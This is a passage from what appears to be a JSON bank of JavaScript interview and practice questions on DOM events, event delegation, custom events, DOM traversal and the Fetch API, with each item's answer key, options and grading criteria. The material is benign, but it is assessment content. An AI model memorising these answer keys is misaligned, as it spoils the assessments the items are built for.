          "evaluationCriteria": [
            "Correctly identifies the element where the event originated.",
            "Correctly identifies the element to which the listener is attached.",
            "Demonstrates understanding of event object properties."
          ],
          "example": "```typescript\ndocument.getElementById('outer').addEventListener('click', function(event) {\n  console.log('Event Target:', event.target.id); // 'inner' - the button that was actually clicked\n  console.log('Event CurrentTarget:', event.currentTarget.id); // 'outer' - the element where the listener is attached\n});\n```\n`event.target` always refers to the element that originally dispatched the event (the innermost element). `event.currentTarget` refers to the element on which the event listener was attached and which is currently handling the event.",
          "tags": [
            "DOM",
            "Events",
            "JavaScript",
            "Event Object"
          ],
          "prerequisites": [
            "theory_dom_events"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_dom_events_3",
          "topic": "DOM Events - Event Delegation",
          "level": "medium",
          "type": "code",
          "question": "Implement an event delegation mechanism for a list of items. When any list item is clicked, its text content should be logged to the console. The list items can be added dynamically after the initial page load.\n\n**HTML Structure:**\n```html\n<ul id=\"myList\">\n  <li>Item 1</li>\n  <li>Item 2</li>\n</ul>\n<button id=\"addItem\">Add New Item</button>\n```",
          "answer": "```javascript\nconst myList = document.getElementById('myList');\nconst addItemButton = document.getElementById('addItem');\nlet itemCounter = 2;\n\n// Implement event delegation on the parent <ul>\nmyList.addEventListener('click', function(event) {\n  // Check if the clicked element (event.target) is an LI element\n  // Use closest() for more robust matching if LIs might contain other elements\n  const clickedLi = event.target.closest('li');\n  if (clickedLi && clickedLi.parentElement === myList) { // Ensure it's a direct child of myList\n    console.log('Clicked item:', clickedLi.textContent);\n    clickedLi.style.backgroundColor = 'lightgreen'; // Optional: highlight clicked item\n  }\n});\n\n// Function to add new items dynamically\naddItemButton.addEventListener('click', function() {\n  itemCounter++;\n  const newItem = document.createElement('li');\n  newItem.textContent = `Item ${itemCounter}`;\n  myList.appendChild(newItem);\n  console.log(`Added: Item ${itemCounter}`);\n});\n```",
          "options": [],
          "analysisPoints": [
            "Correct application of event delegation.",
            "Using `event.target` to identify the specific child element.",
            "Handling dynamically added elements without re-attaching listeners.",
            "Robustness using `closest()` for targeting."
          ],
          "keyConcepts": [
            "Event Delegation",
            "Event Bubbling",
            "event.target",
            "Dynamic Content",
            "DOM Manipulation"
          ],
          "evaluationCriteria": [
            "Solution efficiently handles events for multiple items.",
            "Demonstrates understanding of `event.target` in the context of delegation.",
            "Code is scalable for dynamically added content."
          ],
          "example": "",
          "tags": [
            "DOM",
            "Events",
            "Event Delegation",
            "Code Challenge",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_dom_events",
            "dom_manipulation"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_dom_events_4",
          "topic": "DOM Events - Custom Events",
          "level": "hard",
          "type": "open",
          "question": "Explain what Custom Events are in the context of DOM manipulation and when you might use them in a frontend application. Provide a conceptual example of a scenario where custom events would be beneficial for communication between loosely coupled components.",
          "answer": "Custom Events allow developers to create and dispatch their own named events on DOM elements, just like native browser events (e.g., 'click', 'submit'). They are instantiated using the `CustomEvent` constructor, which takes an event type string and an optional `options` object. The `options` object typically includes a `detail` property to pass custom data, and `bubbles` and `cancelable` booleans to control event propagation and cancellability.\n\n**When to use Custom Events:**\nCustom events are particularly useful for building **loosely coupled components** or modules in a frontend application. Instead of components directly calling methods on each other (creating tight dependencies), they can communicate by dispatching and listening for custom events. This promotes a more modular, scalable, and maintainable architecture.\n\n**Specific Use Cases:**\n1.  **Component Communication:** A child component can notify its parent (or any ancestor) about an internal state change or action without knowing the parent's specific methods.\n2.  **Module Interoperability:** Different parts of an application that are unaware of each other can communicate by broadcasting and reacting to specific events.\n3.  **Global Notifications:** Dispatching a custom event on `document` or `window` can serve as a global notification system for application-wide events.\n4.  **Plugin/Extension Architecture:** Plugins can dispatch custom events to signal their readiness or specific actions, allowing the core application to react without direct integration.\n\n**Conceptual Example: User Authentication Flow**\nImagine an application with two main, independent components:\n*   **`AuthForm` Component:** Handles user login/registration. It's unaware of the rest of the application's UI.\n*   **`Dashboard` Component:** Displays user-specific content. It needs to know when a user logs in to update its state and display relevant information.\n\n**Without Custom Events (tight coupling):**\n`AuthForm` would need a direct reference to `Dashboard` (or a global state manager) and explicitly call `dashboard.updateUser(userData)` or `store.dispatch(loginAction)`. This couples `AuthForm` to `Dashboard`'s interface or a specific state management solution.\n\n**With Custom Events (loose coupling):**\n1.  The `AuthForm` component, upon successful login, dispatches a custom event, say `userLoggedIn`, on a common ancestor element (e.g., `document.body` or its own root element), passing the user data in the `detail` property:\n    ```javascript\n    // Inside AuthForm component on successful login\n    const userData = { id: 1, name: 'Alice' };\n    const loginEvent = new CustomEvent('userLoggedIn', {\n      detail: { user: userData },\n      bubbles: true // Allow event to bubble up\n    });\n    document.body.dispatchEvent(loginEvent);\n    ```\n2.  The `Dashboard` component, or any other component interested in login status, simply listens for this event:\n    ```javascript\n    // Inside Dashboard component (or its initializer)\n    document.body.addEventListener('userLoggedIn', function(event) {\n      const loggedInUser = event.detail.user;\n      console.log('Dashboard received userLoggedIn event for:', loggedInUser.name);\n      // Update Dashboard UI based on loggedInUser data\n    });\n    ```\nThis way, `AuthForm` doesn't need to know about `Dashboard`'s existence or methods. It just broadcasts an event. Any component interested in that event can listen for it, promoting modularity and reusability.",
          "options": [],
          "analysisPoints": [
            "Clear definition of custom events and their mechanism.",
            "Identification of key use cases, especially loose coupling.",
            "Ability to provide a practical, conceptual example.",
            "Comparison of approaches (tight vs. loose coupling)."
          ],
          "keyConcepts": [
            "CustomEvent",
            "dispatchEvent",
            "event.detail",
            "Loose Coupling",
            "Component Communication",
            "Event-Driven Architecture"
          ],
          "evaluationCriteria": [
            "Depth of explanation for custom events.",
            "Relevance and clarity of the use case example.",
            "Demonstration of architectural thinking (loose coupling)."
          ],
          "example": "",
          "tags": [
            "DOM",
            "Events",
            "Custom Events",
            "Architecture",
            "JavaScript",
            "Open-ended"
          ],
          "prerequisites": [
            "theory_dom_events",
            "javascript_objects"
          ],
          "complexity": 9,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_dom_events_5",
          "topic": "DOM Events - Event Options",
          "level": "easy",
          "type": "flashcard",
          "question": "What does the `once: true` option do when passed to `addEventListener`?",
          "answer": "It makes the event listener invoke the handler at most one time, after which it is automatically removed.",
          "options": [],
          "analysisPoints": [
            "Recall the specific functionality of `once` option."
          ],
          "keyConcepts": [
            "addEventListener options",
            "Event Listener removal"
          ],
          "evaluationCriteria": [
            "Quick and accurate recall of `once` functionality."
          ],
          "example": "```typescript\nconst btn = document.getElementById('myButton');\nbtn.addEventListener('click', function() {\n  console.log('This will only run once!');\n}, { once: true });\n```",
          "tags": [
            "DOM",
            "Events",
            "Flashcard",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_dom_events"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_event_methods_1",
          "topic": "Event Methods - stopPropagation() vs preventDefault()",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements accurately describes the effect of `event.stopPropagation()`?",
          "answer": "It prevents the event from bubbling up (or capturing down) the DOM tree to parent (or child) elements.",
          "options": [
            "It stops the default browser action associated with the event.",
            "It prevents the event from bubbling up (or capturing down) the DOM tree to parent (or child) elements.",
            "It removes all other event listeners of the same type on the element.",
            "It pauses the execution of the event handler until a condition is met."
          ],
          "analysisPoints": [
            "Clear distinction between `stopPropagation` and `preventDefault`.",
            "Understanding of event propagation.",
            "Exclusion of unrelated or incorrect options."
          ],
          "keyConcepts": [
            "stopPropagation",
            "Event Bubbling",
            "Event Propagation",
            "preventDefault"
          ],
          "evaluationCriteria": [
            "Correct understanding of `stopPropagation`'s primary function.",
            "Ability to differentiate it from `preventDefault`."
          ],
          "example": "```typescript\nconst parent = document.getElementById('parent');\nconst child = document.getElementById('child');\n\nparent.addEventListener('click', () => console.log('Parent clicked!'));\nchild.addEventListener('click', (event) => {\n  console.log('Child clicked!');\n  event.stopPropagation(); // Parent will NOT log 'Parent clicked!'\n});\n```\n`event.stopPropagation()` is used to control the flow of an event through the DOM tree. It ensures that once the event reaches a certain point and `stopPropagation()` is called, it will not propagate further up (or down during capture phase) the hierarchy. It does not affect the default browser action.",
          "tags": [
            "DOM",
            "Events",
            "stopPropagation",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_event_methods",
            "theory_dom_events"
          ],
          "complexity": 5,
          "interviewFrequency": 10,
          "learningPath": "intermediate"
        },
        {
          "id": "question_event_methods_2",
          "topic": "Event Methods - stopPropagation() vs preventDefault()",
          "level": "medium",
          "type": "open",
          "question": "Describe a real-world scenario where you would use `event.preventDefault()` without `event.stopPropagation()`, and another scenario where you would use both `event.preventDefault()` and `event.stopPropagation()` together.",
          "answer": "**Scenario 1: `event.preventDefault()` without `event.stopPropagation()`**\n\n**Scenario:** Implementing client-side routing with an `<a>` tag that prevents a full page reload but allows the click event to bubble up to a global analytics listener.\n\n**Explanation:**\nImagine a single-page application (SPA) where you use `<a>` tags for navigation, but instead of triggering a full page reload, you want to handle the navigation using a JavaScript router (e.g., React Router, Vue Router). In this case, you would attach a click listener to the `<a>` tag and call `event.preventDefault()` to stop the browser's default action of navigating to the `href` URL.\n\nHowever, you might also have a `document`-level click listener that captures all clicks for analytics purposes (e.g., to track which links are clicked, regardless of whether they lead to an actual page reload or client-side route change). In this scenario, you *want* the event to bubble up to that global listener so that the analytics script can still record the click. Therefore, you would *not* call `event.stopPropagation()`.\n\n```javascript\n// In your routing module\nconst navLink = document.getElementById('myNavLink');\nnavLink.addEventListener('click', function(event) {\n  event.preventDefault(); // Stop default navigation\n  console.log('Client-side route change to:', navLink.getAttribute('href'));\n  // Your routing logic here\n});\n\n// In your analytics module (listening on document)\ndocument.addEventListener('click', function(event) {\n  // This listener will still fire even if preventDefault() was called on a link\n  console.log('Analytics: Click detected on:', event.target.tagName, event.target.id || event.target.className);\n  // Send click data to analytics service\n});\n```\n\n**Scenario 2: `event.preventDefault()` and `event.stopPropagation()` together**\n\n**Scenario:** Creating a custom context menu (right-click menu) inside a specific area of your application, where you want to prevent the default browser context menu *and* ensure no other parent listeners are accidentally triggered.\n\n**Explanation:**\nLet's say you have a `div` element that, when right-clicked, should display a custom context menu specific to your application, instead of the browser's default context menu. You'd attach a `contextmenu` event listener to this `div`.\n\n1.  You would call `event.preventDefault()` to stop the browser from showing its default context menu.\n2.  You would also call `event.stopPropagation()` because if you have other `contextmenu` listeners on parent elements (e.g., `document.body` or `document`) that might be trying to implement their own custom context menus or perform other actions for right-clicks, you want to ensure that this specific custom context menu is the only one that appears and that no other unwanted parent listeners interfere. Stopping propagation ensures the event doesn't trigger unrelated logic higher up the DOM tree.\n\n```javascript\n// HTML:\n// <div id=\"container\" style=\"width: 200px; height: 100px; border: 1px solid black;\">Right-click me for custom menu</div>\n\nconst container = document.getElementById('container');\n\ncontainer.addEventListener('contextmenu', function(event) {\n  event.preventDefault();  // Stop default browser context menu\n  event.stopPropagation(); // Stop event from bubbling to parent contextmenu listeners\n\n  console.log('Displaying custom context menu!');\n  // Logic to display your custom menu at event.clientX, event.clientY\n});\n\n// A global listener that should NOT be triggered for the custom menu area\ndocument.addEventListener('contextmenu', function(event) {\n  console.log('Global context menu listener triggered (should NOT happen for #container)');\n});\n```",
          "options": [],
          "analysisPoints": [
            "Ability to articulate nuanced differences between the methods.",
            "Provision of clear, distinct, and realistic use cases.",
            "Demonstration of understanding of event flow and desired control.",
            "Code snippets illustrating the concepts."
          ],
          "keyConcepts": [
            "preventDefault",
            "stopPropagation",
            "Event Bubbling",
            "Default Browser Actions",
            "Client-Side Routing",
            "Context Menu"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of the scenarios.",
            "Correct application and justification for each method's use.",
            "Depth of understanding of event mechanics."
          ],
          "example": "",
          "tags": [
            "DOM",
            "Events",
            "preventDefault",
            "stopPropagation",
            "Open-ended",
            "Advanced"
          ],
          "prerequisites": [
            "theory_event_methods"
          ],
          "complexity": 9,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_event_methods_3",
          "topic": "Event Methods - stopPropagation()",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary effect of calling `event.stopPropagation()` within an event listener?",
          "answer": "It prevents the event from continuing its propagation (bubbling up or capturing down) through the DOM tree.",
          "options": [],
          "analysisPoints": [
            "Recall the core function of `stopPropagation`."
          ],
          "keyConcepts": [
            "stopPropagation",
            "Event Propagation",
            "Event Bubbling"
          ],
          "evaluationCriteria": [
            "Quick and accurate recall."
          ],
          "example": "```typescript\nconst child = document.getElementById('child');\nchild.addEventListener('click', (e) => {\n  console.log('Child clicked');\n  e.stopPropagation(); // Prevents parent listeners from firing for this click\n});\n```",
          "tags": [
            "DOM",
            "Events",
            "Flashcard",
            "stopPropagation"
          ],
          "prerequisites": [
            "theory_event_methods"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_event_methods_4",
          "topic": "Event Methods - preventDefault()",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary effect of calling `event.preventDefault()` within an event listener?",
          "answer": "It stops the browser's default action associated with that event.",
          "options": [],
          "analysisPoints": [
            "Recall the core function of `preventDefault`."
          ],
          "keyConcepts": [
            "preventDefault",
            "Default Browser Actions"
          ],
          "evaluationCriteria": [
            "Quick and accurate recall."
          ],
          "example": "```typescript\nconst link = document.getElementById('myLink');\nlink.addEventListener('click', (e) => {\n  e.preventDefault(); // Prevents the browser from navigating to the link's href\n  console.log('Link click handled by JS, no navigation.');\n});\n```",
          "tags": [
            "DOM",
            "Events",
            "Flashcard",
            "preventDefault"
          ],
          "prerequisites": [
            "theory_event_methods"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_event_methods_5",
          "topic": "Event Methods - Combining Methods",
          "level": "hard",
          "type": "code",
          "question": "Create an HTML structure with a `<div>` containing a `<a>` tag. Implement JavaScript such that:\n1.  Clicking the `<a>` tag prevents its default navigation behavior.\n2.  Clicking the `<a>` tag also stops the click event from bubbling up to its parent `<div>`.\n3.  Clicking the `<div>` (but not the `<a>` tag) should log 'Div clicked!' to the console.",
          "answer": "```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Methods Demo</title>\n    <style>\n        #parentDiv {\n            padding: 50px;\n            border: 2px solid blue;\n            background-color: lightblue;\n            margin: 20px;\n        }\n        #myLink {\n            display: inline-block;\n            padding: 10px;\n            background-color: lightgreen;\n            border: 1px solid green;\n            cursor: pointer;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"parentDiv\">\n        Parent Div\n        <a id=\"myLink\" href=\"https://www.example.com\">Click Link (won't navigate)</a>\n    </div>\n\n    <script>\n        const parentDiv = document.getElementById('parentDiv');\n        const myLink = document.getElementById('myLink');\n\n        // Listener for the link: stops default and propagation\n        myLink.addEventListener('click', function(event) {\n            event.preventDefault();  // Prevents default navigation\n            event.stopPropagation(); // Stops bubbling to parentDiv\n            console.log('Link clicked! Default prevented and propagation stopped.');\n        });\n\n        // Listener for the parent div\n        parentDiv.addEventListener('click', function() {\n            console.log('Div clicked!');\n        });\n\n        // Test other clicks on body to ensure no unwanted side effects\n        document.body.addEventListener('click', () => {\n            console.log('Body clicked!');\n        });\n\n    </script>\n</body>\n</html>\n```",
          "options": [],
          "analysisPoints": [
            "Correctly implements `preventDefault()` for link navigation.",
            "Correctly implements `stopPropagation()` to prevent bubbling to parent.",
            "Verifies that the parent listener only fires when the parent itself (or other non-link children) is clicked.",
            "Demonstrates a clear understanding of combining event methods."
          ],
          "keyConcepts": [
            "preventDefault",
            "stopPropagation",
            "Event Bubbling",
            "Event Handling"
          ],
          "evaluationCriteria": [
            "Code fulfills all requirements.",
            "Demonstrates precise control over event behavior.",
            "Solution is robust and clearly illustrates the concepts."
          ],
          "example": "",
          "tags": [
            "DOM",
            "Events",
            "Code Challenge",
            "preventDefault",
            "stopPropagation"
          ],
          "prerequisites": [
            "theory_event_methods"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_dom_traversal_1",
          "topic": "DOM Traversal - Element Selection",
          "level": "easy",
          "type": "mcq",
          "question": "Which DOM method would you use to select the *first* element that matches a specific CSS selector (e.g., a class or tag name)?",
          "answer": "document.querySelector()",
          "options": [
            "document.getElementById()",
            "document.querySelectorAll()",
            "document.querySelector()",
            "document.getElementsByClassName()"
          ],
          "analysisPoints": [
            "Understanding the specific purpose of `querySelector`.",
            "Distinguishing it from methods that return collections or require an ID."
          ],
          "keyConcepts": [
            "DOM Traversal",
            "querySelector",
            "CSS Selectors"
          ],
          "evaluationCriteria": [
            "Correct identification of the method for single element selection via CSS selector."
          ],
          "example": "```typescript\n// HTML: <div class=\"container\"><p class=\"text\">Hello</p><p class=\"text\">World</p></div>\nconst firstParagraph = document.querySelector('.text');\nconsole.log(firstParagraph.textContent); // Outputs: Hello\n```\n`document.querySelector()` returns the first element that matches the specified CSS selector. `document.querySelectorAll()` returns a `NodeList` of *all* matching elements. `document.getElementById()` requires an ID. `document.getElementsByClassName()` returns an `HTMLCollection`.",
          "tags": [
            "DOM",
            "Traversal",
            "querySelector",
            "JavaScript"
          ],
          "prerequisites": [
            "dom_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_dom_traversal_2",
          "topic": "DOM Traversal - NodeList vs HTMLCollection",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements about `NodeList` and `HTMLCollection` is TRUE?",
          "answer": "`NodeList` can be static or live, while `HTMLCollection` is always live.",
          "options": [
            "`NodeList` always contains only element nodes, while `HTMLCollection` can contain any node type.",
            "`NodeList` is always live, while `HTMLCollection` is always static.",
            "`NodeList` can be static or live, while `HTMLCollection` is always live.",
            "Neither `NodeList` nor `HTMLCollection` support iteration with `forEach` directly."
          ],
          "analysisPoints": [
            "Key differences between `NodeList` and `HTMLCollection`.",
            "Understanding of 'live' vs 'static' collections.",
            "Knowledge of iteration methods for each collection type."
          ],
          "keyConcepts": [
            "NodeList",
            "HTMLCollection",
            "Live Collections",
            "Static Collections",
            "DOM Traversal"
          ],
          "evaluationCriteria": [
            "Accurate comparison of collection types.",
            "Correct understanding of their 'live'/'static' nature.",
            "Knowledge of their content types."
          ],
          "example": "```typescript\n// Example of static NodeList from querySelectorAll\nconst staticList = document.querySelectorAll('p');\n// If new <p> tags are added later, staticList will NOT reflect them.\n\n// Example of live HTMLCollection from children\nconst parent = document.getElementById('myDiv');\nconst liveCollection = parent.children;\n// If children are added/removed from parent, liveCollection WILL reflect them.\n\n// NodeList.forEach is supported:\nstaticList.forEach(p => console.log(p.textContent));\n\n// HTMLCollection does NOT have forEach directly (requires Array.from or for...of)\n// Array.from(liveCollection).forEach(child => console.log(child.tagName));\n```\n`document.querySelectorAll()` returns a static `NodeList`. If elements matching the selector are added/removed from the DOM after the `NodeList` is created, it will not update. `document.getElementById().children` returns a live `HTMLCollection`, which *does* update dynamically. `NodeList` can contain any node type (text, comment, element), while `HTMLCollection` contains only elements. `NodeList` has a `forEach` method, `HTMLCollection` does not, but both are iterable with `for...of` loops.",
          "tags": [
            "DOM",
            "Traversal",
            "NodeList",
            "HTMLCollection",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_dom_traversal"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_dom_traversal_3",
          "topic": "DOM Traversal - Parent and Sibling Elements",
          "level": "medium",
          "type": "code",
          "question": "Given an HTML element with the ID `targetElement`:\n\n```html\n<div id=\"grandparent\">\n  <p>Some text</p>\n  <div id=\"parent\">\n    <span>Sibling 1</span>\n    <strong id=\"targetElement\">Hello</strong>\n    <em>Sibling 2</em>\n  </div>\n  <!-- Comment Node -->\n</div>\n```\n\nWrite JavaScript code to:\n1.  Get the `parentElement` of `targetElement`.\n2.  Get the `nextElementSibling` of `targetElement`.\n3.  Get the `previousElementSibling` of `targetElement`.\n4.  Log the `id` or `tagName` of each found element. Explain why `nextSibling` might return different results than `nextElementSibling`.",
          "answer": "```javascript\nconst targetElement = document.getElementById('targetElement');\n\n// 1. Get the parentElement\nconst parentEl = targetElement.parentElement;\nconsole.log('Parent Element ID:', parentEl ? parentEl.id : 'None'); // Expected: parent\n\n// 2. Get the nextElementSibling\nconst nextElSibling = targetElement.nextElementSibling;\nconsole.log('Next Element Sibling Tag:', nextElSibling ? nextElSibling.tagName : 'None'); // Expected: EM\n\n// 3. Get the previousElementSibling\nconst prevElSibling = targetElement.previousElementSibling;\nconsole.log('Previous Element Sibling Tag:', prevElSibling ? prevElSibling.tagName : 'None'); // Expected: SPAN\n\n/*\nExplanation for nextSibling vs nextElementSibling:\n\n- `element.nextElementSibling` returns the next sibling that is an *element* node.\n- `element.nextSibling` returns the next sibling *node*, which could be an element, a text node (like whitespace between tags), or a comment node.\n\nIn the provided HTML, there is typically whitespace (a text node) between the `</strong>` tag (targetElement) and the `<em>` tag (Sibling 2). Therefore:\n\n`targetElement.nextElementSibling` will correctly return the `<em>` element.\n`targetElement.nextSibling` would likely return a #text node (representing the whitespace/newline) if formatted with typical indentation in HTML. To get the <em> element using `nextSibling`, you'd need to call `nextSibling` multiple times or filter the childNodes.\n\nThis is why `*ElementSibling` properties are generally preferred when you only care about HTML elements and want to ignore whitespace or comment nodes.\n*/\n\n// Example of nextSibling behavior for demonstration:\nconst nextNode = targetElement.nextSibling;\nconsole.log('Next Sibling Node Type and Value:', nextNode ? `${nextNode.nodeType} - ${nextNode.nodeValue.trim()}` : 'None'); // Likely #text node if whitespace exists\n```",
          "options": [],
          "analysisPoints": [
            "Correct use of `parentElement`, `nextElementSibling`, `previousElementSibling`.",
            "Understanding of the distinction between `*Node` and `*Element` properties.",
            "Clear explanation of whitespace/text nodes impacting `*Sibling` properties.",
            "Ability to debug and reason about DOM structure."
          ],
          "keyConcepts": [
            "DOM Traversal",
            "parentElement",
            "nextElementSibling",
            "previousElementSibling",
            "nextSibling",
            "Node vs Element"
          ],
          "evaluationCriteria": [
            "Code correctly identifies elements.",
            "Explanation is accurate and insightful regarding Node vs. Element properties.",
            "Demonstrates practical knowledge of DOM structure."
          ],
          "example": "",
          "tags": [
            "DOM",
            "Traversal",
            "Code Challenge",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_dom_traversal"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_dom_traversal_4",
          "topic": "DOM Traversal - Efficiency",
          "level": "hard",
          "type": "open",
          "question": "Compare the performance and practical use cases of `document.getElementById()`, `document.querySelector()`, and `document.querySelectorAll()`. When might you prefer one over the others, and are there any considerations for very large DOM trees?",
          "answer": "**`document.getElementById(id)`**\n*   **Performance:** Generally the fastest method. It's highly optimized by browsers because IDs are meant to be unique and can be directly hashed for quick lookup.\n*   **Use Cases:** When you need to access a single, specific element with a known, unique ID. This is ideal for core layout elements, unique interactive components, or as a starting point for further traversal.\n*   **Considerations for Large DOM:** Remains very fast regardless of DOM size due to direct lookup. However, relying too heavily on unique IDs for every element can lead to verbose HTML and less reusable CSS/JS.\n\n**`document.querySelector(selector)`**\n*   **Performance:** Slower than `getElementById()` because it has to parse a CSS selector string and potentially traverse the DOM to find the first match. Its performance depends on the complexity of the selector and the size of the DOM.\n*   **Use Cases:** When you need the first element matching a CSS selector. This is highly flexible, allowing selection by class, tag, attribute, or complex combinations. Useful for specific components or dynamic selections where an ID isn't available or practical.\n*   **Considerations for Large DOM:** For complex selectors or very deep DOM trees, repeated calls to `querySelector()` can impact performance. Caching the result or traversing from a closer parent element can mitigate this.\n\n**`document.querySelectorAll(selector)`**\n*   **Performance:** Generally the slowest of the three. It has to traverse the *entire* relevant sub-tree (or document) to find *all* matching elements and then build a `NodeList` (which is static, meaning changes to the DOM won't affect it). Performance is heavily impacted by selector complexity and the number of matching elements.\n*   **Use Cases:** When you need a collection of elements that share a common characteristic (e.g., all elements of a certain class, all `<li>` tags within a `<ul>`). Useful for bulk operations, iterating over dynamic lists, or applying styles/event listeners to multiple elements.\n*   **Considerations for Large DOM:** For very large numbers of matching elements or highly complex selectors, `querySelectorAll()` can be very expensive. If elements are frequently added/removed, remember that the `NodeList` is static, so you might need to re-query. For very large collections, consider optimizing iteration or using event delegation on a parent instead of attaching individual listeners to each element in the collection.\n\n**Summary of Preference:**\n*   **`getElementById`**: Always prefer if you have a unique ID. Fastest and most direct.\n*   **`querySelector`**: Good for selecting a single element based on flexible CSS selectors when an ID isn't feasible or for more specific targeting (e.g., `div > p.intro`).\n*   **`querySelectorAll`**: Best for getting a collection of elements. Be mindful of performance for very large sets or frequent re-querying, and remember its static nature.\n\nIn scenarios with very large DOM trees or highly dynamic content, combining `getElementById` (to get a fast starting point) with `querySelector`/`querySelectorAll` on that specific sub-tree, or utilizing **event delegation** extensively, are crucial optimization strategies.",
          "options": [],
          "analysisPoints": [
            "Detailed comparison of performance characteristics for each method.",
            "Clear articulation of practical use cases for each.",
            "Discussion of performance implications for large DOMs.",
            "Inclusion of best practices/optimizations (caching, event delegation)."
          ],
          "keyConcepts": [
            "DOM Traversal",
            "getElementById",
            "querySelector",
            "querySelectorAll",
            "Performance Optimization",
            "Live vs Static Collections",
            "Event Delegation"
          ],
          "evaluationCriteria": [
            "Thoroughness of the comparison.",
            "Accuracy of performance insights.",
            "Practical relevance of use cases and considerations.",
            "Demonstration of advanced understanding of DOM APIs."
          ],
          "example": "",
          "tags": [
            "DOM",
            "Traversal",
            "Performance",
            "Optimization",
            "Open-ended",
            "Advanced"
          ],
          "prerequisites": [
            "theory_dom_traversal"
          ],
          "complexity": 9,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_dom_traversal_5",
          "topic": "DOM Traversal - Node Type Distinction",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the difference between `element.childNodes` and `element.children`?",
          "answer": "`element.childNodes` returns a `NodeList` of all child nodes (elements, text, comments, etc.), while `element.children` returns an `HTMLCollection` of only child *element* nodes.",
          "options": [],
          "analysisPoints": [
            "Recall the difference in content type for the two properties."
          ],
          "keyConcepts": [
            "childNodes",
            "children",
            "NodeList",
            "HTMLCollection",
            "DOM Traversal"
          ],
          "evaluationCriteria": [
            "Quick and accurate recall of content differences."
          ],
          "example": "```html\n<div>\n  <!-- Comment -->\n  Text Node\n  <span>Element Node</span>\n</div>\n```\n`div.childNodes` would include the comment node, text node (for 'Text Node' and whitespace), and the `<span>` element. `div.children` would only include the `<span>` element.",
          "tags": [
            "DOM",
            "Traversal",
            "Flashcard",
            "JavaScript"
          ],
          "prerequisites": [
            "theory_dom_traversal"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ajax_fetch_api_1",
          "topic": "Fetch API - Basic Usage",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following is the correct way to initiate a GET request using the Fetch API and handle its successful JSON response?",
          "answer": "fetch('url').then(response => response.json()).then(data => console.log(data))",
          "options": [
            "fetch('url').success(data => console.log(data))",
            "fetch('url').json(data => console.log(data))",
            "fetch('url').then(response => response.json()).then(data => console.log(data))",
            "fetch('url').done(data => console.log(data))"
          ],
          "analysisPoints": [
            "Understanding Fetch's promise-based nature.",
            "Correctly chaining `.then()` calls.",
            "Knowing that `response.json()` returns a promise itself."
          ],
          "keyConcepts": [
            "Fetch API",
            "Promises",
            "Response Object",
            "JSON Parsing"
          ],
          "evaluationCriteria": [
            "Correct syntax for basic Fetch request.",
            "Understanding of `response.json()`'s behavior."
          ],
          "example": "```typescript\nfetch('https://jsonplaceholder.typicode.com/todos/1')\n  .then(response => response.json()) // First .then() to parse JSON, returns a promise\n  .then(data => console.log(data))   // Second .then() to handle the parsed data\n  .catch(error => console.error('Error fetching data:', error)); // Handle network errors\n```\nThe `fetch` function returns a Promise that resolves to a `Response` object. The `Response` object's `json()` method also returns a Promise that resolves with the parsed JSON data. Therefore, two `.then()` calls are typically needed for JSON responses: one for the `Response` object itself, and one for the parsed data.",
          "tags": [
            "Fetch API",
            "AJAX",
            "Promises",
            "JavaScript"
          ],
          "prerequisites": [
            "javascript_promises"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_ajax_fetch_api_2",
          "topic": "Fetch API - Error Handling",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Fetch API call:\n\n```javascript\nfetch('https://api.example.com/non-existent-resource')\n  .then(response => {\n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    return response.json();\n  })\n  .then(data => console.log('Success:', data))\n  .catch(error => console.error('Caught error:', error.message));\n```\n\nIf the URL `https://api.example.com/non-existent-resource` returns a 404 Not Found HTTP status, what will be logged to the console?",
          "answer": "Caught error: HTTP error! status: 404",
          "options": [
            "Success: (with an empty object)",
            "Caught error: Network error",
            "Caught error: HTTP error! status: 404",
            "The code will execute the second `.then()` block, but `data` will be undefined."
          ],
          "analysisPoints": [
            "Understanding Fetch's error handling for HTTP status codes.",
            "Correctly interpreting the `response.ok` property.",
            "Knowledge of how `throw new Error` interacts with `.catch()`."
          ],
          "keyConcepts": [
            "Fetch API",
            "Error Handling",
            "Promises",
            "response.ok",
            "HTTP Status Codes"
          ],
          "evaluationCriteria": [
            "Accurate prediction of Fetch's error flow.",
            "Demonstrates knowledge that `fetch` doesn't reject on HTTP errors by default."
